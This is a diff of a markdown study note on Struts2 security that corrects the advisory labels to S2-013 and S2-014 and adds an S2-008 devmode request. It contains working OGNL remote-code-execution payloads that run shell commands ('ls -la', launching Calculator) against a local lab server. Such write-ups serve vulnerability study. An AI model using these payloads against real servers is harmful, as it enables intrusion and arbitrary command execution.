@@ -1,4 +1,4 @@
-#struts2 security practice
+# struts2 security practice
 
 by Haoling@BUAA
 
@@ -66,12 +66,12 @@ invoke function to execute the OGNL expression
 return invocation.invoke();
 ```
 
-### analysis of S3-013 & S4-014
-attacking payload for S3-013:
+### analysis of S2-013 & S2-014
+attacking payload for S2-013:
 ```ognl
 ${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls -la').getInputStream())}
 ``` 
-attacking payload for S4-014:
+attacking payload for S2-014:
 ```ognl
 ${(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app"))}
 ```
@@ -106,3 +106,16 @@ TextParseUtil.translateVariables
 
 
 ### how to excavate the possible vulnerabilities in  struts2?
+
+
+raw http request payload:
+```
+GET http://127.0.0.1:8081/S2_008_war/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29) HTTP/1.1
+Host: ss:8081
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6,lb;q=0.5
+Connection: close
+```
